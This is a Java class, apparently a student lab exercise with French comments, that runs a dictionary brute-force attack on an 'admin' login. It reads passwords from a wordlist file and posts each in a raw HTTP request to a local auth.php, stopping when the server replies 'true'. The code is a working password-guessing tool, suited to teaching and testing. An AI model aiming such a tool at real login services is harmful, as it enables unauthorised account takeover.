import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;



public class Host {

    BufferedReader bufferedReader;


    public Host() {

        try{

            bufferedReader = new BufferedReader(new FileReader("../../TPBRUTEDICTIONNARY/dictionnary.txt")); // Chargement du fichier en memoire tampon


        }catch (IOException e){
            System.err.println("Erreur lors de la l'ouverture du fichier : " + e.getMessage());


        }

    }
    

    // Methode 1 qui permet d'envoyer une Requette HTTP dont le mot de passe a ete saisi par l'utilisateur au serveur
    public void sendRequest1(String password){

        
       try {

        Scanner input = new Scanner(System.in);
        
        // On appelle la methode prepareRequest qui prepare la requette a envoyer
        if (this.verifyPassword(password))
            return;

        else {

            this.colorText("Mot de passe incorrect".toUpperCase(),"ANSI_RED");
            System.out.print("Saissisez un autre mot de passe : ");
            String newSaisie = input.next();
            this.sendRequest1(newSaisie);
            
        }

       }catch (Exception e){
        e.printStackTrace();
       }
           
       
    }


    public boolean verifyPassword(String password) throws IOException{

      try{

        Socket socket = new Socket ("localhost", 80);
        

        // Creation des flux Input/Output pour l'envoi et la reception de donnees au Serveur via le Socket
        InputStream inputStream = socket.getInputStream();
        OutputStream outputStream = socket.getOutputStream();
        
        // PrintWriter pour l'envoi de donnees au Serveur
        PrintWriter printWriter = new PrintWriter(outputStream, true);
        BufferedReader buffer = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));

        Scanner input = new Scanner(System.in);
        
        String request = this.prepareRequest(password);
        String line = "";

        // On envoie la requette au serveur
        printWriter.println(request);

        // Maintenant on recupere le codeStatus sur la premier ligne=
        String firstLine = buffer.readLine();

        String lastLine = "";

        int codeStatus = Integer.parseInt(firstLine.split(" ")[1]);

        
        if (codeStatus == 200){

            this.colorText("Envoie reussi et CodeStatus : 200","Green");

            // On recupere la reponse du Serveur
            lastLine = this.lastLine(buffer);
        
            if (this.isGoodPassword(lastLine)){

                this.colorText("Bienvenue cher Administrateur".toUpperCase(),"Green");

                System.out.println(firstLine);
               
                

                return true;
            }

            else
                return false;
        
            }else {

                // System.out.println("\n" + ANSI_RED + "Probleme Cote Serveur  ou Erreur au niveau de votre Script" + ANSI_RESET +  "\n");
                this.colorText("Probleme Cote Serveur  ou Erreur au niveau de votre Script","ANSI_RED");
                System.out.println(firstLine);
                // On affiche le reste de la Reponse
                while ((line = buffer.readLine()) != null){
                    System.out.println(line);
                }
                
                return true;
            }
            

        }catch (IOException e){
            e.printStackTrace();

        }
        return false;
    }

    

    // Methode 2 qui permet d'envoyer une Requette HTTP dont le mot de passe a ete fourni  par le dictionnaire au serveur

    public void sendRequest2(){

        int numberLine = 1;

        try {

            String line = " "; 

            while ((line = bufferedReader.readLine()) != null) {
                System.out.println("Line  " + numberLine + " : " + line);
                numberLine++;
                if (this.verifyPassword(line)) {
                    break;
                }else{
                    this.colorText("Mot de passe incorrect".toUpperCase(),"ANSI_RED");

                }
            }

            this.fermerDictionary(bufferedReader);
 
        }catch (IOException e){
            System.err.println("Erreur lors de la l'ouverture du fichier : " + e.getMessage());
            e.printStackTrace();
        }

    }


    public void fermerDictionary(BufferedReader reader) {
        try {
            if (reader != null) {
                reader.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public void colorText(String text, String color){

        String code = "";
        String ANSI_RESET = "\u001B[0m";
        // String ANSI_RED = "\u001B[31m";
        // String ANSI_GREEN = "\u001B[32m";
        if (color.equalsIgnoreCase("ANSI_RED")){
            code =  "\u001B[31m";
        }else {
            code =  "\u001B[32m";
        }

        System.out.println("\n" + code + text + ANSI_RESET  + "\n");

    }


    /**
     * si le mot de passe saisie est bon ou pas
     * @param lastLine
     * @return boolen
     */
    public  Boolean isGoodPassword(String lastLine) {
        
        return lastLine.equals("true");

    }

    /**
     * Permet de retourner la reponse du serveur en cas de succes 200 ok
     * @param buffer
     * @return lastLine
     * @throws IOException
     */
    public String lastLine(BufferedReader buffer) throws IOException{
        String line = "";
        String lastLine = "";
        while ((line = buffer.readLine()) != null){

            lastLine = line;
            
        }

        return lastLine;
    }
    
    // /**
    //  * Permet de retourner la taille de la donnee
    //  * @param data
    //  * @return taille de la donnee
    //  */


    public int contentLength(String data) {

        byte[] postData = data.getBytes(StandardCharsets.UTF_8);

            return postData.length;

    }


    // /**
    //  * Permet de retourner une requette bien prete
    //  * @param password
    //  * @return  request
    //  */
    public String prepareRequest(String password){

        // Il appelle la methode contentLenght et lui passe la donne
        String data = "login=admin&password=" + password;


        return  "POST /TPDP/auth.php HTTP/1.1\r\n" +

        "Host:localhost" + "\r\n" +

        "Content-Type: application/x-www-form-urlencoded\r\n" +

        "Content-Length: " + contentLength(data) + "\r\n" +

        "\r\n" +

        data;
    }

    
}

